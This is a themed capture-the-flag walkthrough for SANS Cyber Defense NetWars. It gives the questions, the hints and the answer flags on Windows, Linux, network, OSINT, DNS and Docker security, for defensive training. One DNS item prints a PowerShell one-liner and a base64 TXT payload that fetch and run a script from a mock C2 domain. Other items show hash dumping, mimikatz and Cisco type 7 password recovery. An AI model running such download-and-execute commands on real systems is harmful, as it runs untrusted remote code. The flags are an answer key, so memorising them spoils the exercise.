

#Objective: Intro 
Night Gathers and Now Your Watch Continues
You are a newly-promoted ranger in the Night's Watch. Your mission: prepare for an imminent visit by Queen Daenerys Targaryen, Breaker of Chains and Protector of the Realm.

Her majesty will be accompanied by her dragons and the Unsullied army. You will protect the queen while securing the firewalls, networks, servers, and applications from attacks by Wildlings, Wights (the undead), and the dreaded Night King.

Please read all module descriptions carefully!
The descriptions contain critical information that is often glossed over by new rangers, which results in a much more difficult challenge. Challenges have been won and lost based upon whether rangers heeded this advice!

Challenge
The Defense NetWars challenge features a series of questions based on the following topics:

Linux Security
Windows Security
Cryptography
Steganography
Network Security Monitoring (NSM)
Continuous Security Monitoring (CSM)
This challenge contains hints, which are free but serve as a tiebreaker. For example: if two rangers achieve the same score, the ranger who took the least amount of hints wins. Each level one and two question contains three hints, level three questions contain one hint, and there are no level four or five hints.

There is no penalty for the first wrong answer to each question; after that each wrong answer costs one point, up to a maximum of three points per question.

Cyber Defense NetWars Linux VM
Many of the upcoming questions can be answered using the provided Defense NetWars Linux virtual machine. The credentials are:

Username: ranger
Password: NightGathers
The Linux VM contains a Cyber Defense NetWars v2.0 Wiki, which is quite helpful (especially the information regarding the various tools available to you). Simply open Firefox to access the wiki.

Windows System
Completing the challenge does not require you to have a Windows system. That said, one way to approach some Windows-related questions is to explore the Windows command-line or basic GUI tools.

Searching for Answers
A few questions might be easier to answer by searching for related information on the Web. Other questions require either solid pre-existing knowledge or Web searches to definitively answer. Web searches are absolutely allowed, sometimes faster than other methods, and in some cases the only way to answer a question.

Game Details
Please join our instructor and TA's in Zoom and in the NetWars Support Slack!

The game will run on August 6, 2020 and August 7, 2020 from 1:00pm-9:00pm (1700-0100 UTC) each day.


________________________________________________________________________________________________

##READ CAREFULLY - ANSWERED BY YOU A DAY AGO 1 POINT
Please answer "Yes" to confirm that you have carefully read the introduction above.


No
Yes


________________________________________________________________________________________________

#Objective: Windows 101 
##NAME THAT OS - ANSWERED BY YOU A DAY AGO 3 POINTS
What is the client operating system that made this request?

GET / HTTP/1.1
Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Accept-Encoding: gzip, deflate
Host: www.twitter.com
Connection: Keep-Alive

Windows 10
**FLAG: Windows 7**
Windows 8
Windows 8.1
Windows XP
Hints:
Inspect the User-Agent: field.

Note the NT kernel version.

Google 'NT kernel versions'.

This Wikipedia article has a good summary:

https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions


________________________________________________________________________________________________

##NAME THAT RID - ANSWERED BY YOU A DAY AGO 3 POINTS
What is the RID (Relative Identifier) of the built-in Administrator account on Windows? Answer with a number.


Hints:
If you have a Windows system available: wmic can list the local accounts.

You may also Google for the answer.

Run the following Windows command as an Administrator:

wmic useraccount get name,sid

Here is example output from wmic. The RID is the last part of the SID, from the last dash [-] to the end of the line. Note that your accounts and SIDs will vary, but the RID will be the same for the Administrator account.

PS C:\WINDOWS\system32> wmic useraccount get name,sid
Name                SID
** Administrator       S-1-5-21-1552841522-3835366585-4197357653-****Flag: 500 **
DefaultAccount      S-1-5-21-1552841522-3835366585-4197357653-503
Guest               S-1-5-21-1552841522-3835366585-4197357653-501
student             S-1-5-21-1552841522-3835366585-4197357653-1001
WDAGUtilityAccount  S-1-5-21-1552841522-3835366585-4197357653-504



________________________________________________________________________________________________

##TASKLIST - ANSWERED BY YOU A DAY AGO 3 POINTS
Inspect the (truncated) tasklist output below. What flag was supplied to tasklist to generate this output?

Answer with a '/' followed by a single flag. For example if the flag is 'A', the answer would be: /A

Note that the answer is not case sensitive.

Image Name                     PID Modules
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        88 N/A
smss.exe                       304 N/A
csrss.exe                      408 N/A
wininit.exe                    480 N/A
csrss.exe                      488 N/A
winlogon.exe                   576 ntdll.dll, KERNEL32.DLL, KERNELBASE.dll,
                                   msvcrt.dll, sechost.dll, RPCRT4.dll,
                                   combase.dll, ucrtbase.dll,
                                   bcryptPrimitives.dll, powrprof.dll,
                                   advapi32.dll, profapi.dll, user32.dll,
                                   win32u.dll, GDI32.dll, gdi32full.dll,
                                   msvcp_win.dll, IMM32.DLL, winsta.dll,
                                   SspiCli.dll, USERENV.dll, profext.dll,
                                   ntmarta.dll, Bcrypt.dll, firewallapi.dll,
                                   fwbase.dll, UXINIT.dll, shcore.dll,
                                   dwmapi.dll, UxTheme.dll, CRYPT32.dll,
                                   MSASN1.dll, DPAPI.dll, CRYPTBASE.dll,
                                   dwminit.dll, apphelp.dll, usermgrcli.dll,
                                   kernel.appcore.dll, MPR.dll
services.exe                   596 N/A
lsass.exe                      632 ntdll.dll, KERNEL32.DLL, KERNELBASE.dll,
                                   RPCRT4.dll, lsasrv.dll, msvcrt.dll,
                                   WS2_32.dll, SspiCli.dll, sechost.dll,
<output truncated>

Hints:
If you have a Windows system: check out the help message for tasklist. Or use Google.

Type the following on a Windows system:

tasklist /?

Look for the option referencing DLLs and modules.

tasklist /?

Note this option:

   /M     [module]         Lists all tasks currently using the given
                           exe/dll name. If the module name is not
                           specified all loaded modules are displayed.


**Flag: /M **


________________________________________________________________________________________________

##NETSTAT - ANSWERED BY YOU A DAY AGO 3 POINTS
Inspect the following output. Which netstat command provided the details on the executable that created the network connection?

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    172.16.164.133:49696   52.230.222.68:443      ESTABLISHED
  WpnService
 [svchost.exe]
  TCP    172.16.164.133:50223   72.21.91.29:80         CLOSE_WAIT
 [wwahost.exe]
  TCP    172.16.164.133:50225   23.192.56.208:443      CLOSE_WAIT
 [wwahost.exe]
  TCP    172.16.164.133:50226   23.192.56.208:443      CLOSE_WAIT
 [wwahost.exe]
  TCP    172.16.164.133:50227   23.192.56.208:443      CLOSE_WAIT
 [wwahost.exe]
  TCP    172.16.164.133:50228   23.192.56.208:443      CLOSE_WAIT
 [wwahost.exe]
  TCP    172.16.164.133:50229   23.192.56.208:443      CLOSE_WAIT
 [wwahost.exe]
  TCP    172.16.164.133:50230   23.192.56.208:443      CLOSE_WAIT
 [wwahost.exe]
  TCP    172.16.164.133:50402   172.217.10.14:80       CLOSE_WAIT
 [chrome.exe]

netstat -na
**Flag: netstat -nb **
netstat -nc
netstat -ne
netstat -no
Hints:
If you have a Windows system: check out the help message for netstat. Or use Google.

Type the following command on a Windows system:

netstat /?

Look for the option describing executables.

netstat /?

Note this option:

  -b            Displays the executable involved in creating each connection or
                listening port. In some cases well-known executables host
                multiple independent components, and in these cases the
                sequence of components involved in creating the connection
                or listening port is displayed. In this case the executable
                name is in [] at the bottom, on top is the component it called,
                and so forth until TCP/IP was reached. Note that this option
                can be time-consuming and will fail unless you have sufficient
                permissions.




________________________________________________________________________________________________

##NAME THE COMMAND STRING - ANSWERED BY YOU A DAY AGO 4 POINTS
Inspect the following output. Which Windows command was used to produce this? Note that the output is not suppressed.

Caption=svchost.exe
CommandLine=C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc
CreationClassName=Win32_Process
CreationDate=20200110143352.259459-300
CSCreationClassName=Win32_ComputerSystem
CSName=MSEDGEWIN10
Description=svchost.exe
ExecutablePath=C:\Windows\system32\svchost.exe
ExecutionState=
Handle=4292
HandleCount=333
InstallDate=
KernelModeTime=781250
MaximumWorkingSetSize=1380
MinimumWorkingSetSize=200
Name=svchost.exe
OSCreationClassName=Win32_OperatingSystem
OSName=Microsoft Windows 10 Enterprise Evaluation|C:\Windows|\Device\Harddisk0\Partition1
OtherOperationCount=1295
OtherTransferCount=38720
PageFaults=6913
PageFileUsage=4504
ParentProcessId=556
PeakPageFileUsage=4772
PeakVirtualSize=2203448102912
PeakWorkingSetSize=17280
Priority=8
PrivatePageCount=4612096
ProcessId=4292
QuotaNonPagedPoolUsage=21
QuotaPagedPoolUsage=167
QuotaPeakNonPagedPoolUsage=23
QuotaPeakPagedPoolUsage=167
ReadOperationCount=11
ReadTransferCount=3953
SessionId=0
Status=
TerminationDate=
ThreadCount=10
UserModeTime=1093750
VirtualSize=2203443900416
WindowsVersion=10.0.17763
WorkingSetSize=9547776
WriteOperationCount=4
WriteTransferCount=3299

powershell -command "Get-Process | Where-Object { $_.Id -eq 4292 }"
tasklist /M | findstr 4292
tasklist /fi "pid eq 4292"
wmic.exe process list full
**Flag: wmic.exe process where ProcessId=4292 get /format:list **
Hints:
Three of these commands do not give you nearly the detail you see above.
You can type wmic.exe /? on a Windows system or go here: https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic
To obtain pertinent information about a single specific process, use wmic.exe process and filter for the ProcessId.




________________________________________________________________________________________________

##NAME THAT HASH - ANSWERED BY YOU A DAY AGO 4 POINTS
Analyze the following smart_hashdump output. What hashing technique will be actively used when authenticating users of this system?

[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     jsnow:1000:aad3b435b51404eeaad3b435b51404ee:a87f3A337d73085C45f9416be5787d86:::
[+]     sshd:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Bcrypt
LANMAN
**Flag: NTLM **
Net-NTLMv1
Net-NTLMv2
SHA-256
Hints:
smart_hashdump is used to capture hashes from the local SAM database.

A LanMan (LM) hash of aad3b435b51404eeaad3b435b51404ee means blank password... but that can also mean that the system does not use LM hashes.

Windows uses two hashing algorithms for storing password hashes locally, and each account has two hashes listed. Since all accounts have the same LM hash but some accounts have different secondary hashes (the 32 hexadecimal character hashes), we know that the LM hashes can't be actively used and that the secondary hashes must be the ones actually used by the system. If you look at https://hashcat.net/wiki/doku.php?id=example_hashes, you'll find a Windows hash type that matches this format.



________________________________________________________________________________________________

##SPEAKING OF HASHES... - ANSWERED BY YOU A DAY AGO 5 POINTS
Enter the name of a well-known tool (with a SHA1 hash of cb58316a65f7fe954adf864b678c694fadceb759) that is designed to extract plaintext passwords, hashes, PIN codes, and kerberos tickets from the memory of a Windows system.

Note: The answer is the name of the tool without any file extension.
Hints:
The hash can lead you to the answer.
Try using VirusTotal to see if the hash has any hits.
https://www.virustotal.com/gui/file/b4f9beb47cc56ab08c571560df4496d3cc4656209597968a4c2e9b105ba475db/details

**Flag: mimikatz **



________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________

#Objective: Linux 101 
________________________________________________________________________________________________

##KERNEL RELEASE - ANSWERED BY YOU A DAY AGO 3 POINTS
What is the kernel release of your Linux VM? Answer is in the format #.#.#-#-string. For example: 1.2.3-4-uncle.
Hints:
Try the uname command.
Take a look at the flags for uname using man uname. One of them may help you discover the kernel version.
uname -r is the correct command.

** Flag: 5.0.0-32-generic **
________________________________________________________________________________________________

##GROUPS - ANSWERED BY YOU A DAY AGO 3 POINTS 1 INCORRECT ATTEMPT
List the groups that ranger is a part of in alphabetical order with only a comma separating them. The answer is case sensitive. Here would be an example: ranger,users,wireshark
Hints:
/etc/passwd will show the user's primary group.
The /etc/group file will show the user's additional groups.
This command will list all of the ranger account's groups as a sorted comma-delimited list:
id ranger | cut -d" " -f3 | grep -Po '\(\K[^)]*' | sort | tr '\n' ',' | sed 's/,$/\n/'

**Flag: docker,ranger,sudo **
________________________________________________________________________________________________

##ESCALATE - ANSWERED BY YOU A DAY AGO 4 POINTS
What is the value of crv in the file /etc/docker/key.json? (Do not include the double quotes!)
Hints:
You cannot read this file as a regular user, so sudo will come in handy.
This file is in JSON format. Therefore, data is represented in "data": "value" pairs and separated by commas. For example, the value of LastName in the JSON data below is Snow.
{"FirstName": "John","LastName": "Snow", "Title": "Lord Commander"}

sudo jq -r '.crv' /etc/docker/key.json will yield the answer.

**Flag: P-256 **
________________________________________________________________________________________________

##HASH TYPE - ANSWERED BY YOU A DAY AGO 3 POINTS
What hash type is the operating system using to store the password for ranger?

Bcrypt
MD4
MD5
SHA-1
SHA-256
**Flag: SHA-512**
Hints:
Hashed representations of passwords are stored in the /etc/shadow file.
man shadow and man crypt may prove useful to understand the data represented in the shadow file.
https://www.shellhacks.com/linux-generate-password-hash/
________________________________________________________________________________________________

##FILE HASH - ANSWERED BY YOU A DAY AGO 3 POINTS
Provide the SHA-1 hash of /home/ranger/background.jpg.
Hints:
The tool you need is part of Ubuntu's coreutils package.
sha1<tab>
sha1sum /home/ranger/background.jpg | awk '{print $1}'

**Flag: fa66481fe052decc70efd5f80235b2f473fcd515 **

________________________________________________________________________________________________

##FILE SYSTEM SEARCH - ANSWERED BY YOU A DAY AGO 4 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
There is a docker-compose.yml file somewhere on the filesystem. Where is it? Include the full path to the the docker-compose.yml file. Example: /etc/dockerfiles/docker-compose.yml
Hints:
There has to be a command somewhere on the system to help you find things.
Check out the flags you can pass to find using man find. I bet one of them will help you search a file by name.
find / -name docker-compose.yml 2>/dev/null
Note that 2>/dev/null sends STDERR (the error messages) to /dev/null, which ignores the errors, so the command prints only STDOUT (the standard output).

**Flag: /opt/elastic/docker-compose.yml **
________________________________________________________________________________________________

##WORD COUNT - ANSWERED BY YOU A DAY AGO 5 POINTS
Per the wc command: how many words are in the docker-compose.yml file you just found?

Hints:
Check out the optional flags you can send to the wc command.
man wc shows an option to count by words.
wc -w /opt/elastic/docker-compose.yml

**Flag: 101 **


________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: Network 101 

##SUBNET MEMBER - ANSWERED BY YOU A DAY AGO 4 POINTS
Which of the following IP addresses is a valid host IP within the 10.11.12.0/23 network?

10.11.11.20
10.11.12.0
**Flag: 10.11.13.251 **
10.13.12.14
172.16.172.16
192.168.1.1
Hints:
Do some subnet math to determine the valid hosts for this subnet. Valid hosts cannot be the first or last address in the calculated range.
Fill out the form properly at http://www.subnet-calculator.com/subnet.php to find the valid host range for this subnet.
Valid hosts in this subnet are 10.11.12.1 through 10.11.13.254.
________________________________________________________________________________________________

##WHO MADE IT? - ANSWERED BY YOU A DAY AGO 4 POINTS
Given the following ifconfig snippet, which vendor most likely produced this network interface card (NIC)?

eth0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	options=400<CHANNEL_IO>
	ether 00:1b:e9:d5:63:a4 
	inet6 fe80::424:ca5d:e0e4:f2ad%en0 prefixlen 64 secured scopeid 0x6 
	inet 192.168.1.144 netmask 0xffffff00 broadcast 192.168.1.255
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active

Apple
**Flag: Broadcom **
Cisco
DAD
Intel
Smart
Hints:
You need to use the hardware address to determine the likely vendor.

The MAC address is 48 bits in length. The first 24 bits (first 6 characters) are significant to answer the question. This is known as the Organizationally Unique Identifier (OUI).
Wireshark has a local file that maps OUIs to vendor:
grep -i '00:1b:e9' /usr/share/wireshark/manuf
________________________________________________________________________________________________

##ARCHITECTURE DECISION - ANSWERED BY YOU A DAY AGO 4 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
If you are shopping for a device to provide the capabilities listed below, which is the best product type to shop for.

Prevent attacks using an in-line position on the network using known attack signatures
Have the flexibility to detect (but not block) specific threats using known attack signatures
Send log data off to a log aggregator/collector for long-term storage

Host-Based Firewall
Host-Based Intrusion Detection System
Host-Based Intrusion Prevention System
Network Intrusion Detection System
**Flag: Network Intrusion Prevention System **
Security Information and Event Management
Hints:
Because the device must reside on the network in an inline fashion, host-based solutions do not fit the bill here.
SIEMs are not inline either.
Because the device must actively block, the only device left on the list is the IPS.
________________________________________________________________________________________________

##HEADER LENGTH - ANSWERED BY YOU A DAY AGO 5 POINTS
When looking at this network frame's hex dump, what is the length, in bytes, of the IPv4 header?

0000   00 0c 29 de 09 bf 00 50 56 f1 1f 38 08 00 45 00
0010   00 84 96 4b 00 00 80 11 ff 6d ac 10 a6 02 ac 10
0020   a6 8c 00 35 f4 9f 00 70 d6 15 ea 6f 81 80 00 01
0030   00 03 00 00 00 00 03 77 77 77 03 6d 73 6e 03 63
0040   6f 6d 00 00 01 00 01 c0 0c 00 05 00 01 00 00 00
0050   05 00 21 0b 77 77 77 2d 6d 73 6e 2d 63 6f 6d 06
0060   61 2d 30 30 30 33 08 61 2d 6d 73 65 64 67 65 03
0070   6e 65 74 00 c0 29 00 05 00 01 00 00 00 05 00 02
0080   c0 35 c0 35 00 01 00 01 00 00 00 05 00 04 cc 4f
0090   c5 cb
Note: No VLAN tagging is in play here.

Hints:
Common layer 2 frame headers are 14 bytes in length.
The layer 3 header begins with the hex 45. The 4 signifies the version. The 5 in the Internet Header Length (IHL) field helps you get to your answer.
The minimum value for the IHL field is 5, which indicates a length of 5 × 32 bits = 160 bits = 20 bytes.

**Flag: 20 **
________________________________________________________________________________________________

##ENCRYPTED IRC - ANSWERED BY YOU A DAY AGO 3 POINTS
Bot herders often use Internet Relay Chat (IRC) to control their bots. What is the well-known TCP port number for IRC if the bot herder chose to use encryption for their IRC communication instead of plaintext?

Hints:
Encrypted IRC will most likely use TLS.
Check out the /etc/services file, or RFC 7194.
grep ^irc /etc/services
Or surf to : https://tools.ietf.org/html/rfc7194
Both show that Internet Relay Chat via TLS/SSL uses the default port of 6697.

**Flag: 6697 **
________________________________________________________________________________________________

##CISCO HASH - ANSWERED BY YOU A DAY AGO 5 POINTS
The sole router administrator has mysteriously disappeared, but - luckily - we have a backup copy of the router configuration. Using the snippet below, recover the administrative password so our new ranger can log in to the router.

username benjen password 7 0224084E0E320A20417C061A0E0453

Hints:
The router is a Cisco IOS device.
The single digit number in that string signifies the type of password hash used.
You can recover the password using tools already present in the VM or by using sites on the public Internet.
7crack is a utility that can recover Cisco Type 7 passwords from the hash. It is already installed in the Cyber Defense VM:
7crack.py --hash 0224084E0E320A20417C061A0E0453
Use an online tool:
Go to https://packetlife.net/toolbox/type7/, enter the hash, and click Reverse.

**Flag: BlueTeamRocks! **


________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: OSINT  
Please note that Internet and Web access is required to find the answers to the OSINT questions.
________________________________________________________________________________________________

##MYSPACE - ANSWERED BY YOU A DAY AGO 5 POINTS 1 INCORRECT ATTEMPT
The Knight King has set up a myspace account. What is the URL of his profile page? Answer with the full URL including https://.
Note: The correct Knight King works for the Army of the Dead.
For example: https://myspace.com/username123

Hints:
You do not need a myspace account to search.
A proper search will yield the results located here: https://myspace.com/search/people?q=knight%20king
If you get multiple results, he works for the Army of the Dead, as stated in his bio.

**Flag: https://myspace.com/knightking888 **
________________________________________________________________________________________________

##MORE SOCIAL MEDIA - ANSWERED BY YOU A DAY AGO 5 POINTS
The Knight King also appears in another social media platform. Answer with the full URL including https:// of the second social media profile.

For example: https://social-media.com/username123

Note: You may find several additional social media profiles. The correct profile has something in common with the myspace profile (the Knight King is either very consistent or very unoriginal). He also posts SPECIFICALLY about the Army of the Dead.

Hints:
If you found the myspace page, inspect the Knight King's URL carefully.
A reverse username search website will come in very handy.
Searching for the username knightking888 at https://namechk.com discovers several instances of that username. You know that the username is taken at a given social media site because it will be greyed out. Visit each and find the one matches the criteria of the question.

**Flag: https://twitter.com/knightking888 **
________________________________________________________________________________________________

##PASTE - ANSWERED BY YOU A DAY AGO 5 POINTS
The Knight King mentions a paste on pastebin.com in the second social media page you found. What is the 14th line of that paste? Note that the answer is case sensitive and includes all punctuation.

Hints:
Simply click the link posted in the second social media account you found earlier.
Be careful of line wrapping if counting lines in the Raw Paste Data.
Look at the lines numbers in the top section. Copy line 14 and paste that as your answer.

**Flag: We will have to be extra careful next time since those SANS students are learning that Blue Team is sexy and will provide the Night's Watch plenty of lessons learned. **

________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: Linux 201  
________________________________________________________________________________________________

##'HIDDEN' FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
There is a 'hidden' file in the ranger account's home directory that contains 11 English words and one special character. The answer is the contents of the file.

Hints:
Wildlings love their files to blend in to appear as legitimate files.
List hidden files in your home directory with ls -al /home/ranger.
To view files with trailing spaces, wrap the filename in quotes, such as cat ". "

**Flag: There is only one thing we say to death: Not today **

________________________________________________________________________________________________

##SETUID - ANSWERED BY YOU A DAY AGO 5 POINTS
How many files on your Linux VM have the setuid bit set?

Hints:
/usr/bin/sudo has the setuid bit set.
The find command can search for files by permissions.
sudo find / -perm -4000 2>/dev/null will display all files with the setuid bit set for the entire file system.
This command will also count them: sudo find / -perm -4000 2>/dev/null | wc -l
Note that 2>/dev/null sends STDERR (the error messages) to /dev/null, which ignores the errors, so the command prints only STDOUT (the standard output).

**Flag: 82 **
________________________________________________________________________________________________

##RECONSTRUCTED FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
At one time, an attacker had a temporary file on the system that contained a 9 word (with punctuation) string. Use the history file located somewhere in the /home/ranger/Desktop/data directory to reconstruct what that file contained and submit as the case-sensitive answer.

Note that part of your challenge includes identifying the name of the history file.
Hints:
This file is 'hidden' in /home/ranger/Desktop/data.
Show the contents of /home/ranger/Desktop/data/.chaos_history to see the wildling's actions.
Recreate the wildling's steps by running every command except the one on line 13.

**Flag: Chaos is not a pit. Chaos is a ladder. **
________________________________________________________________________________________________

##ODD EXECUTABLE - ANSWERED BY YOU A DAY AGO 5 POINTS
There is a single executable file somewhere under /var/log. Find it, and the answer is a 14 word (with punctuation), case-sensitive string that is printed when it is executed.
Hints:
Remember, directories and symbolic links have executable attributes, so filter those out when you're searching.
find has a few flags that will help you find all executables that are files.
find /var/log -executable -not -type d -not -type l 2>/dev/null will show you the file to execute.
Note that 2>/dev/null sends STDERR (the error messages) to /dev/null, which ignores the errors, so the command prints only STDOUT (the standard output).

**Flag: If you think this has a happy ending, you have not been paying attention. **

________________________________________________________________________________________________

##WILDLING INTELLIGENCE - ANSWERED BY YOU A DAY AGO 10 POINTS
Threat intelligence tells us that the wildlings often leave an executable note behind in a file that is EXACTLY 8296 bytes in size AND has the md5 checksum of 4121777a88b99bfdbdfd1930d128478c.

The name of the file often differs, so find and run this executable on your system to receive the flag (case-sensitive and includes punctuation).
Hints:
find has an option to discover files of a certain size.
After running find / -type f -size 8296c -exec ls {} \; 2>/dev/null, check the md5sum hashes of the files.
Note that 2>/dev/null sends STDERR (the error messages) to /dev/null, which ignores the errors, so the command prints only STDOUT (the standard output).
This one-liner will do it: find / -type f -size 8296c -ls -exec md5sum {} \; 2>/dev/null | grep 4121777a88b99bfdbdfd1930d128478c

run /opt/yara/extra/codemirror/torment

**Flag: Everyone is mine to torment.  **

________________________________________________________________________________________________

#COMPROMISED PASSWORD - ANSWERED BY YOU A DAY AGO 10 POINTS
Note: As more breaches happen there is a small chance that more than one hash reports as being compromised. If this is the case, choose the hash with the most compromises.
Using curl and the pwnedpasswords.com API (https://haveibeenpwned.com/API/v2), which of the following password hashes have been previously compromised in a breach? Answer with the full hash.


0251c7ad887d72ec247d6944f9995573bec6b1e5
0b6e3e1673b0225c95aca5ff9fcf02c990274ccc
5b9f2f7bca3d8ca62bafa6b52972bc2e5137e927
6b283bb060c269432d08ac33b47a337c0a40035d
70f212738ef30a79fb5c5839532fe5d71d7b431e
81728e6cb080121e05d7373c46251a6c027e5127
bc6438f0dc55a88b0906cc16a0ec9f5e0e5d75fd
df41df836f08deddbaf2905577888477ec10d8c6
Hints:
https://haveibeenpwned.com/API/v2#PwnedPasswords shows you how to interact with the API.

If you send the first five characters of the hash (represented by ABCDE) to the API, you will receive the last 35 digits and how many times it has been compromised. For example, curl -s https://api.pwnedpasswords.com/range/ABCDE.
Another example: this search: https://api.pwnedpasswords.com/range/21BD1 will return all matching hashes that begin with 21BD1, and print the remaining 35 characters (of the 40-character hash) of each.
mousepad /tmp/hashes.txt
Then copy/paste the hashes into /tmp/hashes.txt:

0251c7ad887d72ec247d6944f9995573bec6b1e5
0b6e3e1673b0225c95aca5ff9fcf02c990274ccc
5b9f2f7bca3d8ca62bafa6b52972bc2e5137e927
6b283bb060c269432d08ac33b47a337c0a40035d
70f212738ef30a79fb5c5839532fe5d71d7b431e
81728e6cb080121e05d7373c46251a6c027e5127
bc6438f0dc55a88b0906cc16a0ec9f5e0e5d75fd
df41df836f08deddbaf2905577888477ec10d8c6
Then save the file.

This script will give you the answer (assuming all of the hashes are in /tmp/hashes.txt):

#!/bin/bash

for i in $(cat /tmp/hashes.txt); do curl -s https://api.pwnedpasswords.com/range/${i:0:5} | grep -i ${i:5:35} | tr -d '\r' | awk -v hash=$i -F ':' '{print hash " : " $2 " hits";}' ; done;

**Flag: 6b283bb060c269432d08ac33b47a337c0a40035d **

________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: DNS  
________________________________________________________________________________________________

##C2 - ANSWERED BY YOU A DAY AGO 10 POINTS
The Wildlings set up a domain at totallynotc2.tk to set up... you guessed it... C2-related DNS records. There is a record at firstmen.totallynotc2.tk that is interesting. What is the data stored in that record? The answer is a base64-encoded string as presented in the DNS record, without any enclosing quotes.
Hints:
Use dig.
Use dig -t any firstmen.totallynotc2.tk to retrieve any records associated with the domain.
The TXT record contains a base64-encoded string.

**Flag: LgAgAHsAIABpAHcAcgAgAC0AdQBzAGUAYgAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdgBlAG4AcwAuAHQAbwB0AGEAbABsAHkAbgBvAHQAYwAyAC4AdABrAC8AcwBlAHQAdQBwAC0AYwAyAC4AcABzADEAIAB9AAoA **
________________________________________________________________________________________________

##POWERSHELL - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
If the following command were executed on a Windows host, which IP address will the machine attempt to download a file from?
powershell -e $((Resolve-DnsName -Type txt firstmen.totallynotc2.tk).Strings)
Hints:
The system will run whatever is returned from that TXT record DNS query.
dig -t txt firstmen.totallynotc2.tk
Then decode the base64. Type the following as one line, with a space between echo and the base64 string:
echo LgAgAHsAIABpAHcAcgAgAC0AdQBzAGUAYgAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdgBlAG4AcwAuAHQAbwB0AGEAbABsAHkAbgBvAHQAYwAyAC4AdABrAC8AcwBlAHQAdQBwAC0AYwAyAC4AcABzADEAIAB9AAoA | base64 -d
Type the following in the Cyber Defense Netwars Linux VM:
dig -t a ravens.totallynotc2.tk

**Flag: 35.199.9.215 **

________________________________________________________________________________________________

##NAMESERVER - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
What is the IPv6 address of the UK-based, authoritative nameserver for totallynotc2.tk? Answer in the full IPv6 address (NO SHORTHAND).

For example: a result of 2001:abcd:1234:9:8:7:6:101 would be answered as 2001:abcd:1234:0009:0008:0007:0006:0101.

Hints:
dig or nslookup will come in handy.
When you find the nameserver of interest using dig -t NS totallynotc2.tk, use dig again to query that nameserver's IPv6 address.
dig -t AAAA ns-1704.awsdns-21.co.uk gives the answer 2600:9000:5306:a800::1 which expands to 2600:9000:5306:a800:0000:0000:0000:0001

**Flag: 2600:9000:5306:a800:0000:0000:0000:0001 **
________________________________________________________________________________________________

##WILDLING CERTIFICATES - ANSWERED BY YOU A DAY AGO 10 POINTS
What is the only CA that the wildlings trust to issue certificates to any totallynotc2.tk systems? Answer with the URL that DNS provides you, not including the double-quotes.

Hints:
There is a DNS record dedicated to providing this information.
Check out the CAA record for totallynotc2.tk.
dig -t CAA totallynotc2.tk | grep issue will give you the answer.

**Flag: letsencrypt.org **


_____________________________________________________________________________________________________
________________________________________________________________________________________________
___________________________________________________________________________________________
#Objective: Docker  
________________________________________________________________________________________________

##CONTAINER IP - ANSWERED BY YOU A DAY AGO 5 POINTS 1 INCORRECT ATTEMPT
What is the IP address of the kibana docker container running in your CyberDefense NetWars VM?
Hints:
Docker has some great documentation on how to retrieve data from a running container.
One way to find the answer is to inspect the container closely.
/opt/elastic/docker-compose.yml was used to create the container, so you could just look in that file as well.

**Flag: 172.21.0.5 **
________________________________________________________________________________________________

##PID 1 - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
What is the first argument to the evebox command (running as PID 1) in the evebox container?
For example: if the command were:
evebox foobar -i filebeat...
...The answer would be foobar

Hints:
You may want to execute a command against the container to check out the processes running inside it.
docker ps will list the NAMES of the running containers (and other information).
You can run commands against the container by using docker exec -it <container name> <command(s)>.
docker exec -it evebox ps -ef will show you PID 1 and the associated command-line. The first argument is the first word on the command-line after the evebox command itself.

**Flag: server **
________________________________________________________________________________________________

##EXPOSED PORTS - ANSWERED BY YOU A DAY AGO 10 POINTS
What ports are being forwarded from the host to the docker containers running in your CyberDefense NetWars VM? Answer with the port numbers separated by commas and in order from smallest to largest. Example: 80,443,995

Hints:
That docker-compose.yml file may come in handy, yet again.
Check out what ports could be exposed.
docker ps -a | grep -Po "(?<=:)[0-9]+(?=-)" | sort -n will show you the exposed ports in order.
docker ps -a | grep -Po "(?<=:)[0-9]+(?=-)" | sort -n | tr '\n' , | sed 's/,$/\n/' will show you the ports as an ordered comma-delimited list.

**Flag: 5601,5636,9200 **

______________________________________________________________________________________________________
________________________________________________________________________________________________
__________________________________________________________________________________________
#Objective: Zeek  
The data in /var/log/bro/2019-11-06 was generated by Zeek (formerly known as Bro) and can be used to answer the following series of questions.
Note that while the project was renamed 'Zeek', tools in your Linux VM still reference 'bro'.
________________________________________________________________________________________________

